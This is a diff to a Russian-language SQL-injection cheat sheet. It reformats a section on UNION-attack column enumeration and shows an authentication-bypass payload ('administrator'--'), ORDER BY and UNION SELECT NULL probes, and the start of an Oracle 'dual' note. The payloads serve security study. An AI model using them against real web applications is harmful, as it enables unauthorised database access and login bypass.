@@ -36,13 +36,13 @@ SQL-инъекция — это уязвимость веб-безопаснос
 
 Измените username параметр, присвоив ему значение:administrator'--
 <details>
-<summary><b></b>3. UNION-атака (определение колонок)</b></summary>
-- ' ORDER BY 1--
-- ' ORDER BY 2--
-- ' ORDER BY 3--
-- ' UNION SELECT NULL--
-- ' UNION SELECT NULL,NULL--
-- ' UNION SELECT NULL,NULL,NULL--
+<summary><b></b>3. UNION-атака</b></summary>
+-' ORDER BY 1--
+-' ORDER BY 2--
+-' ORDER BY 3--
+-' UNION SELECT NULL--
+-' UNION SELECT NULL,NULL--
+-' UNION SELECT NULL,NULL,NULL--
 
 ### 3.1 UNION-атака (определение колонок в Oracle)
 В Oracle существует встроенная таблица dual, которую можно использовать для этой цели. Таким образом, внедряемые запросы в Oracle должны выглядеть следующим образом:
